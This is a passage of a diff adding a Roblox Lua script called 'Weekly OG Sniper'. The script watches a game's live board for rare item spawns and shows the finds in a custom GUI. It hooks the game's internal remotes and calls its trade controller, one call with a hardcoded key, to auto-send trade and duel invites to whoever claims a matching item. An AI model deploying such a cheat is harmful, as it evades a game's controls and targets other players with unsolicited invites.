@@ -1,0 +1,1082 @@
+-- Weekly OG Sniper 
+-- By weekly
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local CONFIG_FILE = "WeeklyOGSniper_Config.json"
+local MAX_CARDS = 30
+local LIFETIME = 60
+local DRAG_SPEED = 1.35
+
+-- ═══════ BACKGROUND / NOTIFICATION IMAGES ═══════
+local BG_IMAGE_ID = "136102941611031"
+local WEEKLY_IMAGE_ID = "91444821153663"
+-- ═══════════════════════════════════════════════
+
+-- Black & white theme
+local G_BG      = Color3.fromRGB(0, 0, 0)
+local G_PANEL   = Color3.fromRGB(12, 12, 12)
+local G_CARD    = Color3.fromRGB(22, 22, 22)
+local G_CARDHV  = Color3.fromRGB(38, 38, 38)
+local G_FIELD   = Color3.fromRGB(30, 30, 30)
+local G_BTN     = Color3.fromRGB(45, 45, 45)
+local G_BTNHV   = Color3.fromRGB(75, 75, 75)
+local G_STROKE  = Color3.fromRGB(235, 235, 235)
+local G_WHITE   = Color3.fromRGB(255, 255, 255)
+local G_DIM     = Color3.fromRGB(170, 170, 170)
+local G_GREEN   = Color3.fromRGB(255, 255, 255)
+local G_RED     = Color3.fromRGB(255, 255, 255)
+local G_YELLOW  = Color3.fromRGB(210, 210, 210)
+
+local c = {autoTrade=false, autoDuel=false, soundEnabled=true, tradeNotifications=true, position=nil, lastTradeAt=0, lastDuelAt=0, filters={ALL=true}}
+pcall(function() if readfile and isfile and isfile(CONFIG_FILE) then local d=HttpService:JSONDecode(readfile(CONFIG_FILE)) if type(d)=="table" then for k,v in pairs(d) do if c[k]~=nil then c[k]=v end end end end end)
+if type(c.filters) ~= "table" then c.filters = { ALL = true } end
+if next(c.filters) == nil then c.filters = { ALL = true } end
+
+local function saveConfig() pcall(function() if writefile then writefile(CONFIG_FILE, HttpService:JSONEncode(c)) end end) end
+
+-- ═══════ TRADE ENGINE ═══════
+local _userCache = {}
+
+local function resolveUserId(target)
+    if not target or target == "" then return nil end
+    if typeof(target) == "Instance" and target:IsA("Player") then return target.UserId end
+    if type(target) == "number" and target > 100 then return target end
+    local n = tonumber(target)
+    if n and n > 100 then return n end
+    local clean = tostring(target):gsub("@",""):gsub("^%s*(.-)%s*$","%1")
+    local lower = clean:lower()
+    if lower == "" or lower == "unclaimed" or lower == "claimed by" or lower == "none" then return nil end
+    if lower == string.lower(LocalPlayer.Name) then return nil end
+    for _, pl in ipairs(Players:GetPlayers()) do
+        if string.lower(pl.Name) == lower or string.lower(pl.DisplayName) == lower then return pl.UserId end
+    end
+    if _userCache[lower] then return _userCache[lower] end
+    local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(clean) end)
+    if ok and id then _userCache[lower] = id return id end
+    return nil
+end
+
+local function findNet()
+    local pk = ReplicatedStorage:FindFirstChild("Packages")
+    return pk and pk:FindFirstChild("Net")
+end
+
+local function findRemoteFlat(name)
+    local net = findNet()
+    if not net then return nil end
+    return net:FindFirstChild(name) or net:FindFirstChild(name, true)
+end
+
+local _tradeCooldowns = {}
+
+local function sendTradeInvite(target)
+    local targetId = resolveUserId(target)
+    if not targetId then return false, "no_target" end
+    if targetId == LocalPlayer.UserId then return false, "self" end
+    local now = os.time()
+    if _tradeCooldowns[targetId] and (now - _tradeCooldowns[targetId]) < 2 then return false, "cooldown" end
+    _tradeCooldowns[targetId] = now
+
+    do
+        local ok, result = pcall(function()
+            local ctrl = ReplicatedStorage:FindFirstChild("Controllers")
+            local tcMod = ctrl and ctrl:FindFirstChild("TradeController")
+            if not tcMod then
+                for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+                    if v:IsA("ModuleScript") and v.Name == "TradeController" then tcMod = v break end
+                end
+            end
+            if not tcMod then return false end
+            local tc = require(tcMod)
+            if tc and type(tc.SendInvite) == "function" then tc:SendInvite(targetId) return true end
+            if tc and type(tc.sendInvite) == "function" then tc:sendInvite(targetId) return true end
+            if tc and type(tc.Invite) == "function" then tc:Invite(targetId) return true end
+            return false
+        end)
+        if ok and result then return true, "ctrl_ok" end
+    end
+
+    do
+        local rf = findRemoteFlat("RF/TradeService/Invite")
+        if rf and rf:IsA("RemoteFunction") then
+            local ok, res = pcall(function() return rf:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", targetId) end)
+            if ok and res ~= false then return true, "rf_ok" end
+            local ok2, res2 = pcall(function() return rf:InvokeServer(targetId) end)
+            if ok2 and res2 ~= false then return true, "rf_ok2" end
+        end
+    end
+
+    do
+        local re = findRemoteFlat("RE/TradeService/Invite") or findRemoteFlat("TradeInvite") or findRemoteFlat("SendTradeInvite")
+        if re and re:IsA("RemoteEvent") then
+            pcall(function() re:FireServer(targetId) end)
+            return true, "re_ok"
+        end
+    end
+
+    return false, "all_failed"
+end
+
+local function sendDuelInvite(target)
+    local targetId = resolveUserId(target)
+    if not targetId then return false, "no_target" end
+    if targetId == LocalPlayer.UserId then return false, "self" end
+
+    do
+        local rf = findRemoteFlat("RF/DuelsMachineService/Invite")
+        if rf and rf:IsA("RemoteFunction") then
+            local ok, res = pcall(function() return rf:InvokeServer(targetId) end)
+            if ok and res ~= false then return true, "duel_rf_ok" end
+        end
+    end
+
+    do
+        local re = findRemoteFlat("RE/DuelsMachineService/Invite") or findRemoteFlat("DuelInvite") or findRemoteFlat("SendDuelInvite")
+        if re and re:IsA("RemoteEvent") then
+            pcall(function() re:FireServer(targetId) end)
+            return true, "duel_re_ok"
+        end
+    end
+
+    return false, "duel_all_failed"
+end
+
+local shownNotifs = {}
+local NOTIF_DEDUP = 5
+local showNotif
+
+local function notifyOnce(uid, message, brainrotName, mutation)
+    if not c.tradeNotifications or not showNotif then return end
+    local key = tostring(uid)
+    local now = tick()
+    if shownNotifs[key] and now - shownNotifs[key] < NOTIF_DEDUP then return end
+    shownNotifs[key] = now
+    showNotif(message, brainrotName, mutation, uid)
+end
+
+task.spawn(function()
+    while true do
+        task.wait(10)
+        local now = tick()
+        for k, ts in pairs(shownNotifs) do if now - ts > 15 then shownNotifs[k] = nil end end
+    end
+end)
+
+-- ═══════ ANIMALS API ═══════
+local Animals = {}
+do
+    local function safeRequire(inst) if not inst then return nil end local ok, mod = pcall(require, inst) if ok and type(mod) == "table" then return mod end return nil end
+    local _api
+    function Animals.API()
+        if _api ~= nil then return _api or nil end
+        _api = false
+        local paths = {{"Shared","Animals"},{"Modules","Animals"},{"Shared","Animal"},{"Animals"}}
+        for _, parts in ipairs(paths) do
+            local node = ReplicatedStorage
+            for _, part in ipairs(parts) do node = node and node:FindFirstChild(part) end
+            if node and node:IsA("ModuleScript") then local m = safeRequire(node) if m and type(m.AttachOnViewport) == "function" then _api = m return m end end
+        end
+        return nil
+    end
+    function Animals.source(name)
+        local src = ReplicatedStorage:FindFirstChild(name, true)
+        if src and not src:IsA("Model") then src = src:FindFirstAncestorOfClass("Model") or src:FindFirstChildWhichIsA("Model") end
+        return src
+    end
+    local spinners = {}
+    RunService.RenderStepped:Connect(function(dt)
+        for vpf, s in pairs(spinners) do
+            if not vpf.Parent then spinners[vpf] = nil
+            elseif s.on then s.angle = s.angle + dt * 0.7 local cf = s.model:GetBoundingBox() local maxDim = math.max(s.model:GetExtentsSize().X, s.model:GetExtentsSize().Y, s.model:GetExtentsSize().Z) local dist = (maxDim * 0.5 / math.tan(math.rad(25))) * 0.8 s.cam.CFrame = CFrame.new(cf.Position + (CFrame.Angles(0, s.angle, 0) * Vector3.new(-1, 0.28, -1).Unit) * (dist + maxDim * 0.5), cf.Position) end
+        end
+    end)
+    function Animals.render(vpf, name, mutation, opts)
+        opts = opts or {} if not vpf or not name then return end
+        for _, ch in ipairs(vpf:GetChildren()) do if ch:IsA("Model") or ch:IsA("WorldModel") or ch:IsA("Camera") then ch:Destroy() end end
+        vpf.CurrentCamera = nil spinners[vpf] = nil
+        local model = nil local api = Animals.API()
+        if api then
+            local ok = false
+            if api.AttachOnViewportWithOptimizations then ok = pcall(function() api:AttachOnViewportWithOptimizations(name, vpf, "None", nil) end)
+            elseif api.AttachOnViewport then ok = pcall(function() api:AttachOnViewport(name, vpf, "None", nil) end) end
+            if ok then for _=1,10 do task.wait() for _, c2 in ipairs(vpf:GetChildren()) do if c2:IsA("Model") then model = c2 break end end if model then break end end end
+        end
+        if not model then local src = Animals.source(name) if src then local clone = src:Clone() for _, d in ipairs(clone:GetDescendants()) do if d:IsA("BasePart") then d.Anchored = true end end clone.Parent = vpf model = clone end end
+        if model then
+            if mutation and mutation ~= "None" and api and api.ApplyMutation then pcall(function() api:ApplyMutation(model, name, mutation) end) end
+            local cam = Instance.new("Camera") cam.FieldOfView = 50 cam.Parent = vpf vpf.CurrentCamera = cam
+            spinners[vpf] = {cam=cam, model=model, angle=math.rad(math.random(-25,25)), on=opts.spin}
+        end
+    end
+end
+
+-- ═══════ HELPERS ═══════
+local function mk(cl, pr, pa) local o = Instance.new(cl) for k,v in pairs(pr or {}) do o[k]=v end o.Parent=pa return o end
+local function cr(o,r) return mk("UICorner",{CornerRadius=UDim.new(0,r)},o) end
+local function sk(o,co,t,tr) return mk("UIStroke",{Color=co or G_STROKE,Thickness=t or 1,Transparency=tr or .3,ApplyStrokeMode=Enum.ApplyStrokeMode.Border},o) end
+local function tw(o,p,t) TweenService:Create(o,TweenInfo.new(t or .15,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),p):Play() end
+
+pcall(function() local old = PlayerGui:FindFirstChild("WeeklyOGSniper") if old then old:Destroy() end end)
+local G = mk("ScreenGui", {Name="WeeklyOGSniper", ResetOnSpawn=false, IgnoreGuiInset=true, DisplayOrder=999, ZIndexBehavior=Enum.ZIndexBehavior.Sibling}, PlayerGui)
+mk("UIScale", {Scale = 0.50}, G)
+
+-- ═══════ NOTIFICATIONS ═══════
+local NotifContainer = mk("Frame", {
+    Name = "NotifContainer",
+    Size = UDim2.new(0, 400, 0, 500),
+    Position = UDim2.new(0.5, -200, 0.14, 0),
+    BackgroundTransparency = 1,
+    ZIndex = 1000,
+}, G)
+mk("UIListLayout", {
+    SortOrder = Enum.SortOrder.LayoutOrder,
+    Padding = UDim.new(0, 10),
+    VerticalAlignment = Enum.VerticalAlignment.Top,
+    HorizontalAlignment = Enum.HorizontalAlignment.Center,
+}, NotifContainer)
+
+local notifIndex = 0
+
+showNotif = function(message, brainrotName, mutation, targetUserId)
+    notifIndex = notifIndex + 1
+    local myIdx = notifIndex
+
+    local nFrame = mk("Frame", {
+        Size = UDim2.new(0, 0, 0, 0),
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        BackgroundColor3 = G_PANEL,
+        BorderSizePixel = 0,
+        LayoutOrder = -myIdx,
+        ClipsDescendants = true,
+        ZIndex = 1001,
+        BackgroundTransparency = 1,
+    }, NotifContainer)
+    cr(nFrame, 12)
+    local nStroke = sk(nFrame, G_WHITE, 2, 1)
+
+    local logoFrame = mk("Frame", {
+        Position = UDim2.fromOffset(10, 10),
+        Size = UDim2.fromOffset(70, 70),
+        BackgroundColor3 = G_FIELD,
+        BorderSizePixel = 0,
+        ZIndex = 1002,
+    }, nFrame)
+    cr(logoFrame, 10)
+    sk(logoFrame, G_STROKE, 1.5, 0.3)
+    mk("ImageLabel", {
+        Size = UDim2.fromScale(1, 1),
+        BackgroundTransparency = 1,
+        Image = "rbxassetid://" .. WEEKLY_IMAGE_ID,
+        ScaleType = Enum.ScaleType.Fit,
+        ZIndex = 1003,
+    }, logoFrame)
+
+    local brainrotFrame = mk("Frame", {
+        AnchorPoint = Vector2.new(1, 0),
+        Position = UDim2.new(1, -10, 0, 10),
+        Size = UDim2.fromOffset(70, 70),
+        BackgroundColor3 = Color3.fromRGB(10, 10, 10),
+        BorderSizePixel = 0,
+        ZIndex = 1002,
+    }, nFrame)
+    cr(brainrotFrame, 8)
+    sk(brainrotFrame, G_STROKE, 1.5, 0.3)
+
+    if brainrotName and brainrotName ~= "" then
+        local vf = mk("ViewportFrame", {
+            Size = UDim2.fromScale(1, 1),
+            BackgroundTransparency = 1,
+            ZIndex = 1003,
+        }, brainrotFrame)
+        cr(vf, 8)
+        task.spawn(Animals.render, vf, brainrotName, mutation, {spin = true})
+    end
+
+    mk("TextLabel", {
+        Position = UDim2.fromOffset(90, 14),
+        Size = UDim2.new(1, -180, 0, 18),
+        BackgroundTransparency = 1,
+        Font = Enum.Font.GothamBold,
+        Text = "SUCCESS",
+        TextColor3 = G_WHITE,
+        TextSize = 13,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        ZIndex = 1003,
+    }, nFrame)
+
+    if targetUserId and type(targetUserId) == "number" then
+        local profileFrame = mk("Frame", {
+            Position = UDim2.new(0.5, -95, 0, 38),
+            Size = UDim2.fromOffset(20, 20),
+            BackgroundColor3 = G_CARD,
+            BorderSizePixel = 0,
+            ZIndex = 1004,
+        }, nFrame)
+        cr(profileFrame, 10)
+        sk(profileFrame, G_STROKE, 1, 0.3)
+        mk("ImageLabel", {
+            Size = UDim2.fromScale(1, 1),
+            BackgroundTransparency = 1,
+            Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150"):format(targetUserId),
+            ScaleType = Enum.ScaleType.Crop,
+            ZIndex = 1005,
+        }, profileFrame)
+    end
+
+    mk("TextLabel", {
+        Position = UDim2.fromOffset(targetUserId and 118 or 90, 34),
+        Size = UDim2.new(1, targetUserId and -210 or -180, 0, 36),
+        BackgroundTransparency = 1,
+        Font = Enum.Font.GothamMedium,
+        Text = message or "Successfully sent",
+        TextColor3 = G_WHITE,
+        TextSize = 11,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        TextWrapped = true,
+        TextYAlignment = Enum.TextYAlignment.Top,
+        ZIndex = 1003,
+    }, nFrame)
+
+    mk("TextLabel", {
+        Position = UDim2.fromOffset(90, 74),
+        Size = UDim2.new(1, -180, 0, 14),
+        BackgroundTransparency = 1,
+        Font = Enum.Font.GothamBold,
+        Text = (mutation and mutation ~= "None" and "[" .. mutation .. "] " or "") .. (brainrotName or ""),
+        TextColor3 = G_DIM,
+        TextSize = 10,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        TextTruncate = Enum.TextTruncate.AtEnd,
+        ZIndex = 1003,
+    }, nFrame)
+
+    tw(nFrame, {Size = UDim2.new(0, 360, 0, 100), BackgroundTransparency = 0}, 0.22)
+    tw(nStroke, {Transparency = 0.1}, 0.22)
+
+    task.delay(3.5, function()
+        if nFrame and nFrame.Parent then
+            tw(nFrame, {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}, 0.25)
+            task.delay(0.3, function() if nFrame and nFrame.Parent then nFrame:Destroy() end end)
+        end
+    end)
+end
+
+-- ═══════ MAIN UI ═══════
+local W, Ht = 340, 540
+local ip = UDim2.new(.5, -W/2, .5, -Ht/2)
+if c.position and tonumber(c.position.xS) then ip = UDim2.new(c.position.xS, c.position.xO, c.position.yS, c.position.yO) end
+
+local Wn = mk("Frame", {Size=UDim2.fromOffset(W,Ht), Position=ip, BackgroundColor3=G_BG, BorderSizePixel=0, ClipsDescendants=true}, G)
+cr(Wn,14)
+sk(Wn,G_STROKE,1.5,.4)
+
+-- Background image
+mk("ImageLabel", {
+    Name = "BackgroundImage",
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://" .. BG_IMAGE_ID,
+    ScaleType = Enum.ScaleType.Crop,
+    ImageTransparency = 0.55,
+    ZIndex = 0,
+}, Wn)
+
+-- Header
+local HD = mk("Frame", {Size=UDim2.new(1,0,0,54), BackgroundColor3=G_PANEL, BorderSizePixel=0, ZIndex=2}, Wn)
+cr(HD,14)
+
+local Title = mk("TextLabel", {
+    Position = UDim2.fromOffset(14, 6),
+    Size = UDim2.new(1, -140, 0, 24),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Michroma,
+    Text = "WEEKLY OG SNIPER",
+    TextColor3 = G_WHITE,
+    TextSize = 16,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 3,
+}, HD)
+sk(Title, G_WHITE, 1, 0.72)
+
+local SL = mk("TextLabel", {
+    Position = UDim2.fromOffset(14, 31),
+    Size = UDim2.new(1, -140, 0, 14),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamMedium,
+    Text = "Brainrot | 0 total",
+    TextColor3 = G_DIM,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextTruncate = Enum.TextTruncate.AtEnd,
+    ZIndex = 3,
+}, HD)
+
+-- Minimize / Close buttons (moved more to the right)
+local MB = mk("TextButton", {Position=UDim2.new(1,-74,0,12), Size=UDim2.fromOffset(26,26), BackgroundColor3=G_BTN, BorderSizePixel=0, AutoButtonColor=false, Text="−", TextColor3=G_WHITE, TextSize=16, Font=Enum.Font.GothamBold, ZIndex=3}, HD) cr(MB,6) sk(MB,G_STROKE,1,.4)
+local XB = mk("TextButton", {Position=UDim2.new(1,-42,0,12), Size=UDim2.fromOffset(26,26), BackgroundColor3=G_BTN, BorderSizePixel=0, AutoButtonColor=false, Text="", ZIndex=3}, HD) cr(XB,6) sk(XB,G_STROKE,1,.4)
+mk("Frame", {AnchorPoint=Vector2.new(.5,.5), Position=UDim2.fromScale(.5,.5), Size=UDim2.fromOffset(10,2), BackgroundColor3=G_WHITE, BorderSizePixel=0, Rotation=45, ZIndex=4}, XB)
+mk("Frame", {AnchorPoint=Vector2.new(.5,.5), Position=UDim2.fromScale(.5,.5), Size=UDim2.fromOffset(10,2), BackgroundColor3=G_WHITE, BorderSizePixel=0, Rotation=-45, ZIndex=4}, XB)
+
+MB.MouseEnter:Connect(function() tw(MB,{BackgroundColor3=G_BTNHV},.12) end)
+MB.MouseLeave:Connect(function() tw(MB,{BackgroundColor3=G_BTN},.12) end)
+XB.MouseEnter:Connect(function() tw(XB,{BackgroundColor3=G_BTNHV},.12) end)
+XB.MouseLeave:Connect(function() tw(XB,{BackgroundColor3=G_BTN},.12) end)
+
+-- Body
+local BD = mk("Frame", {Position=UDim2.fromOffset(0,54), Size=UDim2.new(1,0,1,-54), BackgroundTransparency=1, ZIndex=2}, Wn)
+
+-- Cards list
+local LS = mk("ScrollingFrame", {Position=UDim2.fromOffset(12,12), Size=UDim2.new(1,-24,0,250), BackgroundTransparency=1, BorderSizePixel=0, ScrollBarThickness=4, ScrollBarImageColor3=G_STROKE, CanvasSize=UDim2.new(), AutomaticCanvasSize=Enum.AutomaticSize.Y, ScrollingDirection=Enum.ScrollingDirection.Y, ZIndex=3}, BD)
+mk("UIListLayout", {Padding=UDim.new(0,6), SortOrder=Enum.SortOrder.LayoutOrder}, LS)
+local EL = mk("TextLabel", {Size=UDim2.new(1,0,0,80), BackgroundTransparency=1, Font=Enum.Font.GothamMedium, Text="Waiting for spawns...", TextColor3=G_DIM, TextSize=12, TextWrapped=true, LayoutOrder=-10000, ZIndex=3}, LS)
+
+-- Settings panel
+local ST = mk("Frame", {Position=UDim2.new(0,12,0,268), Size=UDim2.new(1,-24,0,206), BackgroundColor3=G_PANEL, BorderSizePixel=0, ZIndex=3}, BD)
+cr(ST,10)
+sk(ST,G_STROKE,1,.5)
+mk("TextLabel", {Position=UDim2.fromOffset(12,8), Size=UDim2.new(1,-24,0,14), BackgroundTransparency=1, Font=Enum.Font.GothamBold, Text="SETTINGS", TextColor3=G_WHITE, TextSize=10, TextXAlignment=Enum.TextXAlignment.Left, ZIndex=4}, ST)
+
+local function mt(y,l,k,oc)
+    local r = mk("Frame", {Position=UDim2.fromOffset(12,y), Size=UDim2.new(1,-24,0,22), BackgroundTransparency=1, ZIndex=4}, ST)
+    mk("TextLabel", {Size=UDim2.new(1,-50,1,0), BackgroundTransparency=1, Font=Enum.Font.GothamMedium, Text=l, TextColor3=G_WHITE, TextSize=11, TextXAlignment=Enum.TextXAlignment.Left, ZIndex=5}, r)
+    local sw = mk("Frame", {Position=UDim2.new(1,-36,.5,-8), Size=UDim2.fromOffset(36,16), BackgroundColor3=c[k] and G_BTN or G_FIELD, BorderSizePixel=0, ZIndex=5}, r)
+    cr(sw,8) sk(sw,G_STROKE,1,.5)
+    local kn = mk("Frame", {Position=c[k] and UDim2.new(1,-14,0,2) or UDim2.fromOffset(2,2), Size=UDim2.fromOffset(12,12), BackgroundColor3=G_WHITE, BorderSizePixel=0, ZIndex=6}, sw)
+    cr(kn,6)
+    local b = mk("TextButton", {Size=UDim2.fromScale(1,1), BackgroundTransparency=1, Text="", ZIndex=6}, r)
+    b.MouseButton1Click:Connect(function()
+        c[k] = not c[k]
+        tw(sw,{BackgroundColor3=c[k] and G_BTN or G_FIELD},.15)
+        tw(kn,{Position=c[k] and UDim2.new(1,-14,0,2) or UDim2.fromOffset(2,2)},.15)
+        saveConfig()
+        if oc then oc(c[k]) end
+    end)
+end
+mt(28,"Auto Trade","autoTrade")
+mt(54,"Auto Duel","autoDuel")
+mt(80,"Sound Alert","soundEnabled")
+mt(106,"Trade Notifications","tradeNotifications")
+
+-- Filter buttons
+mk("TextLabel", {Position=UDim2.fromOffset(12,154), Size=UDim2.new(1,-24,0,14), BackgroundTransparency=1, Font=Enum.Font.GothamBold, Text="BRAINROT MODELS", TextColor3=G_WHITE, TextSize=10, TextXAlignment=Enum.TextXAlignment.Left, ZIndex=4}, ST)
+local FilterBar = mk("Frame", {Position=UDim2.fromOffset(12,172), Size=UDim2.new(1,-24,0,24), BackgroundTransparency=1, ZIndex=4}, ST)
+mk("UIListLayout", {FillDirection=Enum.FillDirection.Horizontal, Padding=UDim.new(0,4), SortOrder=Enum.SortOrder.LayoutOrder}, FilterBar)
+
+local filterOpts = {
+    {name="ALL", key="ALL"},
+    {name="OGs", key="OGs"},
+    {name="STR", key="strawberry elephant"},
+    {name="MEO", key="meowl"},
+    {name="SKI", key="skibidi"},
+    {name="JOH", key="john pork"},
+    {name="DRA", key="dragon"}
+}
+local fBtns = {}
+
+local OG_KEYS = {"skibidi", "meowl", "john pork", "strawberry elephant", "dragon"}
+
+local function isOGItem(name)
+    local lname = string.lower(name or "")
+    for _, key in ipairs(OG_KEYS) do
+        if string.find(lname, key, 1, true) then return true end
+    end
+    return false
+end
+
+local cards, BY, creating, totalCount, spawnCounter = {}, {}, {}, 0, 0
+local observedScrolls = {}
+
+local function updateStatus() SL.Text = string.format("Brainrot | %d total", totalCount) end
+local function getUIDFromEntry(entry) local uid = entry:GetAttribute("UID") if uid then return uid end local f = entry:FindFirstChild("Filler") return f and f:GetAttribute("UID") or entry.Name end
+
+local function itemMatchesFilter(name)
+    if c.filters["ALL"] then return true end
+    if next(c.filters) == nil then return true end
+    if c.filters["OGs"] then return isOGItem(name) end
+    local lname = string.lower(name or "")
+    for key, on in pairs(c.filters) do
+        if on and key ~= "ALL" and key ~= "OGs" and string.find(lname, string.lower(key), 1, true) then return true end
+    end
+    return false
+end
+
+local function applyFilter()
+    for _, cData in pairs(BY) do
+        if cData.Root and cData.Root.Parent then
+            cData.Root.Visible = itemMatchesFilter(cData.Name)
+        end
+    end
+end
+
+for i, opt in ipairs(filterOpts) do
+    local fb = mk("TextButton", {
+        Size = UDim2.fromOffset(opt.key == "OGs" and 44 or 36, 24),
+        BackgroundColor3 = c.filters[opt.key] and G_BTN or G_FIELD,
+        BorderSizePixel = 0,
+        AutoButtonColor = false,
+        Text = opt.name,
+        TextColor3 = G_WHITE,
+        Font = Enum.Font.GothamBold,
+        TextSize = 9,
+        LayoutOrder = i,
+        ZIndex = 5
+    }, FilterBar)
+    cr(fb,6) sk(fb,G_STROKE,1,.4)
+    fBtns[opt.key] = fb
+
+    fb.MouseButton1Click:Connect(function()
+        if opt.key == "ALL" then
+            c.filters = { ALL = true }
+        elseif opt.key == "OGs" then
+            if c.filters["OGs"] and next(c.filters) ~= nil and not c.filters["ALL"] then
+                c.filters["OGs"] = nil
+                if next(c.filters) == nil then c.filters = { ALL = true } end
+            else
+                c.filters = { OGs = true }
+            end
+        else
+            if c.filters["ALL"] then
+                c.filters = { [opt.key] = true }
+            elseif c.filters["OGs"] then
+                c.filters["OGs"] = nil
+                c.filters[opt.key] = true
+            else
+                if c.filters[opt.key] then
+                    c.filters[opt.key] = nil
+                    if next(c.filters) == nil then c.filters = { ALL = true } end
+                else
+                    c.filters[opt.key] = true
+                end
+            end
+        end
+        for k, btn in pairs(fBtns) do
+            btn.BackgroundColor3 = c.filters[k] and G_BTN or G_FIELD
+        end
+        saveConfig()
+        applyFilter()
+    end)
+end
+
+local MUTS_LIST = {
+    "Gold", "Diamond", "Bloodrot", "Candy", "Lava",
+    "Galaxy", "Yin Yang", "Radioactive", "Cursed",
+    "Rainbow", "Divine", "Cyber", "Phantom", "Crystal", "Eclipse",
+}
+local function getMutationInfo(nameOrMut)
+    if not nameOrMut or nameOrMut == "" then return nil end
+    local lower = string.lower(tostring(nameOrMut)):gsub("_", " ")
+    for _, k in ipairs(MUTS_LIST) do if lower == string.lower(k) then return k end end
+    for _, k in ipairs(MUTS_LIST) do if string.find(lower, string.lower(k), 1, true) then return k end end
+    return nil
+end
+
+local function readOwnerFromEntry(entryFrame)
+    if not entryFrame or not entryFrame.Parent then return "" end
+    local filler = entryFrame:FindFirstChild("Filler") or entryFrame
+    if not filler then return "" end
+    local pBg = filler:FindFirstChild("PlayerBg")
+    if not pBg then return "" end
+    local un = pBg:FindFirstChild("Username")
+    if un and un:IsA("TextLabel") and un.Text ~= "" then
+        local clean = un.Text:gsub("<[^>]->", ""):gsub("^%s*(.-)%s*$", "%1")
+        if clean ~= "" and clean:lower() ~= "unclaimed" and clean:lower() ~= "claimed by" then return clean end
+    end
+    return ""
+end
+
+-- Auto-trade / auto-duel on detection (or owner change)
+local function triggerAutoInvites(cData)
+    if not cData then return end
+    if not cData.OwnerName or cData.OwnerName == "" then return end
+    if cData.OwnerName == LocalPlayer.Name then return end
+    if not itemMatchesFilter(cData.Name) then return end
+    if not (c.autoTrade or c.autoDuel) then return end
+
+    task.spawn(function()
+        local resolvedId = resolveUserId(cData.OwnerName)
+        if not resolvedId or resolvedId == LocalPlayer.UserId then return end
+        if c.autoTrade then sendTradeInvite(resolvedId) end
+        if c.autoDuel then sendDuelInvite(resolvedId) end
+        local label
+        if c.autoTrade and c.autoDuel then label = "Successfully sent Trade + Duel to @" .. cData.OwnerName
+        elseif c.autoTrade then label = "Successfully sent Trade to @" .. cData.OwnerName
+        else label = "Successfully sent Duel to @" .. cData.OwnerName end
+        notifyOnce(resolvedId, label, cData.Name, cData.Mutation)
+    end)
+end
+
+local function setOwner(uid, newOwner)
+    if not uid or not BY[tostring(uid)] then return end
+    local cData = BY[tostring(uid)]
+    if not newOwner or newOwner == "" then return end
+    if newOwner == cData.OwnerName then return end
+    cData.OwnerName = newOwner
+
+    if cData.OwnerLbl and cData.OwnerLbl.Parent then
+        cData.OwnerLbl.Text = "@" .. newOwner .. " • " .. (cData.TimeLbl or "")
+        cData.OwnerLbl.TextColor3 = G_WHITE
+    end
+
+    task.spawn(function()
+        local pl = Players:FindFirstChild(newOwner)
+        local resolvedId = pl and pl.UserId or nil
+        if not resolvedId then
+            local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(newOwner) end)
+            if ok and id then resolvedId = id end
+        end
+        if not resolvedId then return end
+        if cData.ProfileImg and cData.ProfileImg.Parent then
+            cData.ProfileImg.Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150"):format(resolvedId)
+            cData.ProfileFrame.Visible = true
+        end
+    end)
+
+    triggerAutoInvites(cData)
+end
+
+local remoteCache = {}
+local REMOTE_HOOKED = false
+
+local function hookRemotes()
+    if REMOTE_HOOKED then return end
+    local pk = ReplicatedStorage:FindFirstChild("Packages")
+    local net = pk and pk:FindFirstChild("Net")
+    if not net then return end
+
+    local newEntry = net:FindFirstChild("RE/Liveboard/NewEntry")
+    if newEntry and newEntry:IsA("RemoteEvent") then
+        newEntry.OnClientEvent:Connect(function(...)
+            for i = 1, select("#", ...) do
+                local a = select(i, ...)
+                if type(a) == "table" and a.UID then
+                    remoteCache[tostring(a.UID)] = {
+                        mutation = a.Mutation,
+                        owner = a.OwnerName or a.Owner,
+                        loc = a.IsLocalServer and "THIS SERVER" or "REMOTE",
+                        ts = tick()
+                    }
+                end
+            end
+        end)
+    end
+
+    local claimEntry = net:FindFirstChild("RE/Liveboard/ClaimEntry")
+    if claimEntry and claimEntry:IsA("RemoteEvent") then
+        claimEntry.OnClientEvent:Connect(function(...)
+            local uid, owner
+            for i = 1, select("#", ...) do
+                local a = select(i, ...)
+                if type(a) == "table" then
+                    uid = uid or a.UID or a.Id or a.EntryId
+                    owner = owner or a.OwnerName or a.Owner or a.Username or a.PlayerName or a.ClaimedBy
+                end
+            end
+            if uid and owner then setOwner(uid, owner) end
+        end)
+    end
+
+    REMOTE_HOOKED = true
+end
+
+task.spawn(function()
+    for _ = 1, 100 do
+        hookRemotes()
+        if REMOTE_HOOKED then break end
+        task.wait(0.05)
+    end
+end)
+
+local function mkCard(entryFrame, rawName, loc, owner, timeText, attributeMutation)
+    local uid = getUIDFromEntry(entryFrame)
+    if BY[tostring(uid)] or creating[tostring(uid)] then return end
+    creating[tostring(uid)] = true
+
+    local cleanName = rawName:gsub("<[^>]->", ""):gsub("^%s*(.-)%s*$", "%1")
+    local mutation = attributeMutation
+    if not mutation or mutation == "" or mutation == "None" or mutation == "Default" then
+        mutation = getMutationInfo(cleanName)
+    end
+    if mutation and mutation ~= "None" then
